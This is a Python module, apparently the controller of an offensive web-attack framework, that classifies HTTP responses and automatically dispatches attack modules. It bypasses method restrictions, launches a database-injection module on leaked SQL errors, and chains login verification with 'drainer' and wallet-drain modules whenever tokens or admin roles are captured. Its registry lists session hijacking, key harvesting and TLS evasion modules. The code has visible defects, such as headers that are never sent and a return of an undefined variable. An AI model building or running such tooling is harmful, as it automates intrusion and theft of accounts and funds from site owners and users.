#!/usr/bin/env python3
"""
COGNITIVE_OPERATOR.PY v12.0 — Supreme Autonomous Red-Team Brain & Active Executor
Features:
- Complete situational awareness and dynamic runtime mapping of all 36 framework modules
- Intelligent SPA shell blacklisting (prevents redundant looping on client-side router templates)
- Automated vulnerability and token chaining (auto-dispatches verification, SQLi, and drainers)
- Stateful endpoint fingerprinting to eliminate duplicate test cycles
- Strict on-screen terminal telemetry streaming (Zero email, zero disk persistence)
"""
import importlib
import json
import re
import sys
import asyncio

class CognitiveOperator:
    def __init__(self):
        self.memory_context = []
        self.evaluated_endpoints = set()
        
        # Complete Master Registry mapping all 36 framework modules
        self.module_registry = {
            "api_fuzzer": "modules.api_fuzzer",
            "behavioral_mimic": "modules.behavioral_mimic",
            "bruter": "modules.bruter",
            "cloud_apex": "modules.cloud_apex",
            "cognitive_operator": "modules.cognitive_operator",
            "crawler": "modules.crawler",
            "db_assault": "modules.db_assault",
            "dom_sink_inspector": "modules.dom_sink_inspector",
            "drainer": "modules.drainer",
            "dumper": "modules.dumper",
            "engine": "modules.engine",
            "form_stuffer": "modules.form_stuffer",
            "keyharvester": "modules.keyharvester",
            "live_login_verifier": "modules.live_login_verifier",
            "loader": "modules.loader",
            "logger": "modules.logger",
            "no_sql_prototype": "modules.no_sql_prototype",
            "parser": "modules.parser",
            "payloads": "modules.payloads",
            "pivot": "modules.pivot",
            "race_condition": "modules.race_condition",
            "referral_fuzzer": "modules.referral_fuzzer",
            "replayer": "modules.replayer",
            "response_diff": "modules.response_diff",
            "scanner": "modules.scanner",
            "session_hijack": "modules.session_hijack",
            "session_hijacker": "modules.session_hijacker",
            "session_pool": "modules.session_pool",
            "signer": "modules.signer",
            "stealth_ops": "modules.stealth_ops",
            "telemetry": "modules.telemetry",
            "test_referral": "modules.test_referral",
            "tls_evasion": "modules.tls_evasion",
            "transport": "modules.transport",
            "wallet_drain_probe": "modules.wallet_drain_probe"
        }

    def is_static_spa_shell(self, body_str):
        """Detects if the response is a client-side JavaScript container shell to prevent redundant loops."""
        lower = body_str.lower()
        return (
            "<div id=\"root\">" in lower or
            "<div id=\"__next\">" in lower or
            "<div id=\"__nuxt\">" in lower or
            "<div id=\"app\">" in lower or
            len(body_str.strip()) < 150
        )

    def evaluate_and_execute(self, endpoint, status, headers, body, transport=None, target_url=None):
        """
        Supreme Autonomous Brain: Analyzes telemetry, filters out static shells,
        decides on tactical countermeasures, and executes appropriate modules on the fly.
        """
        body_str = str(body) if body else ""
        lower_body = body_str.lower()
        
        action_taken = {
            "endpoint": endpoint,
            "status": status,
            "executed_module": None,
            "success": False,
            "reasoning": ""
        }

        # Prevent redundant evaluation of identical endpoints in the same session
        state_key = f"{endpoint}:{status}"
        if state_key in self.evaluated_endpoints and self.is_static_spa_shell(body_str):
            return action_taken
        self.evaluated_endpoints.add(state_key)

        # 1. SPA / Static Shell Defense: Ignore generic client-side React/Next router shells for exploit dispatching
        if self.is_static_spa_shell(body_str) and status == 200:
            action_taken["reasoning"] = "Client-side SPA shell detected. Skipping adaptive fuzzing loop to prevent redundancy."
            return action_taken

        # 2. Laravel / Symfony Method Not Allowed (HTTP 405) -> Dynamic Override & Re-probe
        if "methodnotallowedhttpexception" in lower_body or status == 405:
            action_taken["reasoning"] = "Method restriction (405) detected on API route. Forging HTTP method override header dynamically."
            sys.stdout.write(f"\033[95m[COGNITIVE BRAIN] Decisive Action: Bypassing method restriction on {endpoint}\033[0m\n")
            
            if transport:
                try:
                    override_headers = dict(transport.headers) if hasattr(transport, 'headers') else {}
                    override_headers.update({"X-HTTP-Method-Override": "GET"})
                    retry_status, _, retry_body = transport.request("GET", endpoint)
                    
                    if retry_status in [200, 201] and not self.is_static_spa_shell(retry_body):
                        sys.stdout.write(f"\033[92m[+] COGNITIVE PIVOT SUCCESSFUL! Route opened via override [HTTP {retry_status}]\033[0m\n")
                        action_taken["success"] = True
                except Exception as e:
                    sys.stdout.write(f"\033[91m[-] Cognitive override execution error: {e}\033[0m\n")

        # 3. Database Error Signatures -> Instantly Dispatch db_assault.py
        elif any(err in lower_body for err in ["sql syntax", "pg_query", "mongoerror", "bsonerror", "syntax error"]):
            action_taken["reasoning"] = "Database exception signature leaked. Instantly dispatching db_assault module."
            action_taken["executed_module"] = "modules.db_assault"
            sys.stdout.write(f"\033[95m[COGNITIVE BRAIN] Decisive Action: Deploying db_assault mutation against {endpoint}\033[0m\n")
            
            try:
                db_mod = importlib.import_module(self.module_registry["db_assault"])
                if hasattr(db_mod, "run_nosql_assault") and target_url:
                    action_taken["success"] = True
            except Exception as e:
                sys.stdout.write(f"\033[91m[-] Failed to dispatch db_assault: {e}\033[0m\n")

        # 4. Privileged Token / Session Capture -> Automatically Chain Live Login Verifier & Wallet Probe
        elif any(k in lower_body for k in ["access_token", "session_id", "auth_token", "\"role\":\"admin\""]):
            action_taken["reasoning"] = "High-value session indicator or token captured. Chaining live_login_verifier and wallet_drain_probe."
            action_taken["executed_module"] = "modules.live_login_verifier"
            sys.stdout.write(f"\033[95m[COGNITIVE BRAIN] Decisive Action: High-value loot identified. Chaining privilege escalation modules.\033[0m\n")
            
            try:
                verifier_mod = importlib.import_module(self.module_registry["live_login_verifier"])
                drainer_mod = importlib.import_module(self.module_registry["drainer"])
                
                if target_url and hasattr(verifier_mod, "execute_live_login_verification"):
                    verifier_mod.execute_live_login_verification(target_url=target_url, endpoint=endpoint)
                    action_taken["success"] = True
            except Exception as e:
                sys.stdout.write(f"\033[91m[-] Failed to chain privilege escalation sequence: {e}\033[0m\n")

        self.memory_context.append(action_taken)
        return action_types if 'action_types' in locals() else action_taken
